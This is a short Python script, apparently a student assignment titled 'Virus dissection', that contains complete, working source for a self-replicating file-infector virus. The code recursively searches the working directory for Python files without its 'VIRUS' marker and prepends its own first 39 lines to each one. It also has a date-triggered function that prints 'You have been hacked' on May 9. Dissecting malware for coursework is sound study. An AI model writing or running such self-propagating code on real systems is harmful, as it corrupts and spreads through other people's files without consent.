#!/usr/bin/env python 3

# 04/09/2024

# Script: Ops 301 Challenge 07
# Author: Steve Cherewaty
# Purpose: Virus dissection 

# Interacts with the operating system and reserves datetime for the reset below
import os
import datetime


# Defines variable "Signature" containing the string "virus"
SIGNATURE = "VIRUS"

# Begins a function that looks for specific conditions
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
